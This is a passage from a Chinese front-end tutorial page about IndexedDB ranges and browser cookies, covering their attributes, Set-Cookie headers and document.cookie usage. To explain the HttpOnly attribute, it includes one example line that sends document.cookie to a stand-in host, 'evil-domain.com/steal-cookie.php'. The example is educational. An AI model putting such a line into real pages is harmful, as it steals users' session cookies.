class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">// 只有3</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">// {lower: 3, upper: 3, lowerOpen: false, upperOpen: false}</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var r2 = IDBKeyRange.only(3)</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>可以用Range对象作为openCursor()方法的参数，读取指定范围的数据。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">var t = db.transaction([&quot;people&quot;],&quot;readonly&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var store = t.objectStore(&quot;people&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var index = store.index(&quot;name&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">var range = IDBKeyRange.bound(&#x27;B&#x27;, &#x27;D&#x27;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">index.openCursor(range).onsuccess = function(e) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    var cursor = e.target.result;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    if(cursor) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">        console.log(cursor.key + &quot;:&quot;);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">        for(var field in cursor.value) {</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">            console.log(cursor.value[field]);</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">        }</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">        cursor.continue();</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">    }</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">}</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>常用的存储库：</p><ul><li><a href="https://github.com/localForage/localForage">localForage</a></li></ul><p><strong>1. 为什么要有cookie？</strong></p><p>因为http是无状态的，即使用户登陆后，它还是不知道用户是否已经登录。服务端可以通过cookie保存用户信息到客户端，客户端发请求时总是会附带上这段信息。</p><p><strong>2. cookie的常用场景？</strong></p><ul><li>对话管理：保存登录、购物车等信息</li><li>个性化：主题、字体、背景色</li><li>追踪：记录和分析用户行为</li></ul><p><strong>3. cookie的特点？</strong></p><ul><li>容量小、保存的个数有限制：不同浏览器不一样，一般是小于4kb，个数不超过30个。超出后cookie将被忽略，不会被设置。</li><li>域名、端口相同，则可以共享cookie，注意不要求协议相同。</li></ul><p><strong>4. cookie的属性有哪些？</strong></p><ul><li>Expires：cookie的过期时间，过期后，浏览器将删除这个cookie。它的值是UTC格式。可以使用Date.prototype.toUTCString()转换格式。如果不设置设个属性或设为null，则是session cookie。另外浏览器是根据本地时间决定cookie是否过期，所以cookie没办法保证是在服务器指定时间过期。</li></ul><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token dom variable" style="color:rgb(214, 222, 235)">document</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;age=12;expires=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">new</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(255, 203, 139)">Date</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;2019-9-1&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// &quot;age=12;expires=Sun Sep 01 2019 00:00:00 GMT+0800 (CST)&quot;</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 要加时区才行</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token dom variable" style="color:rgb(214, 222, 235)">document</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;age=12;expires=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">new</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(255, 203, 139)">Date</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;2019-9-1&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token method function property-access" style="color:rgb(130, 170, 255)">toUTCString</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// &quot;age=12;expires=Sat, 31 Aug 2019 16:00:00 GMT&quot;</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><ul><li>Max-age：从现在开始过多少秒后cookie过期，比如一年是<code>60 * 60 * 24 * 365</code>。如果同时指定了Expires和Max-Age，则Max-Age优先。如果没有指定，则是session cookie。</li><li>Domain：指定发http请求时，哪些域名要附带这个cookie，如果没有指定，则默认是当前的一级域名，比如www.xx.com 会设为xx.com。所以访问xx.com的任何子域，http请求都会带这个cookie。如果Domain不属于当前域名，浏览器会拒绝这个cookie。当前发送 Cookie 的域名的一部分。</li><li>Path：Path属性指定浏览器发出 HTTP 请求时，哪些路径要附带这个 Cookie。只要浏览器发现，Path属性是 HTTP 请求路径的开头一部分，就会在头信息里面带上这个 Cookie。比如，PATH属性是/，那么请求/docs路径也会包含该 Cookie。当然，前提是域名必须一致，是绝对路径。</li><li>Secure：只能服务端写入。https下才会发送cookie。如果是http，浏览器会忽略从服务端发送来的Secure属性。该属性只是一个开关，不需要指定值。如果通信是 HTTPS 协议，该开关自动打开。</li><li>HttpOnly：只能服务端写入。指定该 Cookie 无法通过 JavaScript 脚本拿到。通过document.cookie、XMLHttpRequest对象和Request API都获取不到，只有浏览器发出http请求时，才会带上该Cookie，该属性可以防止第三方恶意代码获取cookie。</li></ul><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">(new Image()).src = &quot;http://www.evil-domain.com/steal-cookie.php?cookie=&quot; + document.cookie;</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p><strong>5. 服务端操作cookie</strong></p><p>服务端要设置cookie，需要在http头里设置<code>Set-Cookie</code>字段，可以包含多个。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">HTTP/1.0 200 OK</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Content-type: text/html</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: yummy_cookie=choco</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: tasty_cookie=strawberry</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>除了值之外，还可以附加cookie的属性，一个Set-Cookie字段里面，可以同时包括多个属性，没有次序的要求。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Expires=&lt;date&gt;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Max-Age=&lt;non-zero-digit&gt;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Domain=&lt;domain-value&gt;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Path=&lt;path-value&gt;</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; Secure</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: &lt;cookie-name&gt;=&lt;cookie-value&gt;; HttpOnly</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">// 包括多个属性</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>如果服务器想改变一个早先设置的 Cookie，必须同时满足四个条件：Cookie 的key、domain、path和secure都匹配。举例来说，如果原始的 Cookie 是用如下的Set-Cookie设置的。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: key1=value1; domain=example.com; path=/blog</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>改变上面这个 Cookie 的值，就必须使用同样的Set-Cookie。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">Set-Cookie: key1=value2; domain=example.com; path=/blog</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>只要有一个属性不同，就会生成一个全新的 Cookie，而不是替换掉原来那个 Cookie。
Set-Cookie: key1=value2; domain=example.com; path=/
上面的命令设置了一个全新的同名 Cookie，但是path属性不一样。下一次访问example.com/blog的时候，浏览器将向服务器发送两个同名的 Cookie。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">Cookie: key1=value1; key1=value2</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>上面代码的两个 Cookie 是同名的，匹配越精确的 Cookie 排在越前面。</p><p><strong>6、客户端操作cookie</strong></p><p>客户端发送请求时，每次都会把cookie放在http头的Cookie字段中发送给服务端。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-undefined codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token plain">GET /sample_page.html HTTP/1.1</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Host: www.example.org</span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">Cookie: name=zhangsan1; age=12; Webstorm-dbb44fa0=e4a0db2b-0f80-47e9-acd1-4688f2e4ace9; optimizelyEndUserId=oeu1508308702253r0.1659170844255642;</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>服务端收到cookie后，无法知道cookie的过期时间，可cookie是哪个域名设置的，一级还是二级。</p><p>通过document.cookie可以获取cookie。注意，需要以服务器网页方式打开，不能以本地<code>file://</code>形式。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token dom variable" style="color:rgb(214, 222, 235)">document</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">cookie</span><span class="token plain">   </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// &quot;name=zs;age=12&quot;</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p><img src="./_img/getcookie.png"/></p><p>设置cookie，注意等号两边不要有空格，而且必须对分号、逗号和空格进行转义（它们都不允许作为 Cookie 的值），这可以用encodeURIComponent方法做到。</p><p>document.cookie读写行为的差异（一次可以读出全部 Cookie，但是只能写入一个 Cookie），与 HTTP 协议的 Cookie 通信格式有关。浏览器向服务器发送 Cookie 的时候，Cookie字段是使用一行将所有 Cookie 全部发送；服务器向浏览器设置 Cookie 的时候，Set-Cookie字段是一行设置一个 Cookie。</p><pre class="mdxCodeBlock_iHAB"><div class="codeBlockWrapper_2av3"><pre class="prism-code language-javascript codeBlock_2GNs" style="color:#d6deeb;background-color:#011627"><div class="token-line" style="color:#d6deeb"><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 设置cookie</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token dom variable" style="color:rgb(214, 222, 235)">document</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">encodeURIComponent</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;username&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">encodeURIComponent</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;jero&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain" style="display:inline-block"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 删除cookie,通过设置过期时间</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain"></span><span class="token dom variable" style="color:rgb(214, 222, 235)">document</span><span class="token punctuation" style="color:rgb(199, 146, 234)">.</span><span class="token property-access">cookie</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">=</span><span class="token plain"> </span><span class="token function" style="color:rgb(130, 170, 255)">encodeURIComponent</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;username&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"></span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">                  </span><span class="token function" style="color:rgb(130, 170, 255)">encodeURIComponent</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;cover&#x27;</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">                  </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;;domain=ke.qq.com&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span></div><div class="token-line" style="color:#d6deeb"><span class="token plain">                  </span><span class="token string" style="color:rgb(173, 219, 103)">&#x27;;expires=&#x27;</span><span class="token plain"> </span><span class="token operator" style="color:rgb(127, 219, 202)">+</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(127, 219, 202)">new</span><span class="token plain"> </span><span class="token class-name" style="color:rgb(255, 203, 139)">Date</span><span class="token punctuation" style="color:rgb(199, 146, 234)">(</span><span class="token number" style="color:rgb(247, 140, 108)">0</span><span class="token punctuation" style="color:rgb(199, 146, 234)">)</span><span class="token plain">  </span><span class="token comment" style="color:rgb(99, 119, 119);font-style:italic">// 1970.1.1</span></div></pre><button type="button" aria-label="Copy code to clipboard" class="copyButton_1Zmi">Copy</button></div></pre><p>cookie的属性一旦设置，就不能读取，比如上面代码中读取不到expires和domain。</p><p>可以使用<code>[js-cookie](https://github.com/js-cookie/js-cookie)</code>库来简单的进行操作。</p><p><strong>7、禁用cookie</strong></p><p>浏览器如果禁用了cookie，则不能再设置cookie，请求也不再向服务器发送cookie。查看cookie是否被禁用，可以通过<code>navigator.cookieEnabled</code>，它是只读的。</p><p>chrome禁用cookie的方法是，<code>设置 -&gt; 内容设置 -&gt; cookie</code>。禁用后<code>navigator.cookieEnabled</code>的返回值是false。此时之前设置的cookie不动，之后不能再操作cookie了（读取、新增、修改、删除都不行）。如果再启用cookie，之前设置的cookie还是有效的。</p><p>cookie分为临时cookie（session cookie）和持久cookie，没有设置过期时间的是临时cookie，浏览器关闭时自动清除。</p><p>3、domain可以设置成上级的域名，比如三级域名设置成2级域名
4、path，如果设置了path，只有在那个path才有这个cookie，其它path没有
5、在请求数据时，cookie会自动带上
6、cookie出现的原因是http是无状态的，不知道用户是否登录。
7、客户端和服务端都能读取和操作cookie。</p><p><strong>8. 什么是签名cookie？</strong></p><h2><a aria-hidden="true" class="anchor" id="service-worker"></a><a aria-hidden="true" class="hash-link" href="#service-worker">#</a>Service Worker</h2><h2><a aria-hidden="true" class="anchor" id="参考资料"></a><a aria-hidden="true" class="hash-link" href="#参考资料">#</a>参考资料</h2><ul><li><a href="https://developers.google.com/web/fundamentals/primers/service-workers/">Service Worker</a></li><li><a href="https://tools.ietf.org/html/rfc6265">http state management mechanism</a></li><li><a href="http://javascript.ruanyifeng.com/bom/indexeddb.html">IndexedDB：浏览器端数据库</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API/Using_IndexedDB">使用 IndexedDB</a></li><li><a href="https://zhuanlan.zhihu.com/p/26639553">HTML5 进阶系列：indexedDB 数据库</a></li><li><a href="https://developers.google.com/web/ilt/pwa/working-with-indexeddb">Working with IndexedDB</a></li><li><a href="http://www.zhangxinxu.com/wordpress/2017/07/html5-indexeddb-js-example/">HTML5 indexedDB前端本地存储数据库实例教程</a></li><li><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API">mdn IndexedDB API</a></li><li><a href="https://www.w3.org/TR/IndexedDB-2/">w3 indexedDB</a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">mdn http cookie</a></li><li><a href="https://baike.baidu.com/item/cookie/1119?fr=aladdin">cookie百度百科</a></li><li><a href="http://javascript.ruanyifeng.com/bom/cookie.html">阮一峰cookie</a></li></ul></div></article><div class="margin-top--xl margin-bottom--lg"><nav class="pagination-nav"><div class="pagination-nav__item"><a class="pagination-nav__link" href="/docs/f2e/browser/fetch"><h5 class="pagination-nav__link--sublabel">Previous</h5><h4 class="pagination-nav__link--label">« <!-- -->网络请求</h4></a></div><div class="pagination-nav__item pagination-nav__item--next"><a class="pagination-nav__link" href="/docs/f2e/browser/devtool"><h5 class="pagination-nav__link--sublabel">Next</h5><h4 class="pagination-nav__link--label">Chrome 开发者工具<!-- --> »</h4></a></div></nav><div id="gitalk-container"></div></div></div></div><div class="col col--3"><div class="tableOfContents_1X5y"><ul class="contents contents__left-border"><li><a href="#简介" class="contents__link">简介</a></li><li><a href="#localstorage-和-sessionstorage" class="contents__link">localStorage 和 sessionStorage</a></li><li><a href="#cookie" class="contents__link">Cookie</a></li><li><a href="#通过node操作cookie" class="contents__link">通过Node操作cookie</a></li><li><a href="#cookie安全和加盐" class="contents__link">cookie安全和加盐</a></li><li><a href="#总结" class="contents__link">总结</a></li><li><a href="#深入：web-storage规范解读" class="contents__link">深入：web storage规范解读</a></li><li><a href="#service-worker" class="contents__link">Service Worker</a></li><li><a href="#参考资料" class="contents__link">参考资料</a></li></ul></div></div></div></div></div></main></div></div>
</div>

<script type="text/javascript" src="/runtime~main.0b078f7cdcdfcdb429c2.js"></script>

<script type="text/javascript" src="/main.477abd2e0f7ae11842aa.js"></script>

<script type="text/javascript" src="/0.c9587aaf32602224b53a.js"></script>

<script type="text/javascript" src="/1.b87e7195a03649b49435.js"></script>

<script type="text/javascript" src="/2.e8f1f759c4320c5032f6.js"></script>

<script type="text/javascript" src="/component---theme-doc-legacy-page-9-e-7-ca5.1085c0ca4dac1d879092.js"></script>

<script type="text/javascript" src="/docsMetadata---docs-9-a-9-239.efc62167d7e7e974bd14.js"></script>

<script type="text/javascript" src="/3.7c5f5d1df2cb93bbc10a.js"></script>

<script type="text/javascript" src="/component---theme-doc-legacy-item-031-769.63af36fb5b293fb44f17.js"></script>

<script type="text/javascript" src="/content---docs-f-2-e-browser-storage-0-e-2-cd2.e4c1c246ee4ee3ef5ef5.js"></script>

<script type="text/javascript" src="/metadata---docs-f-2-e-browser-storagea-21-a7b.2693ccc675c0f98748f7.js"></script>

</body>
</html>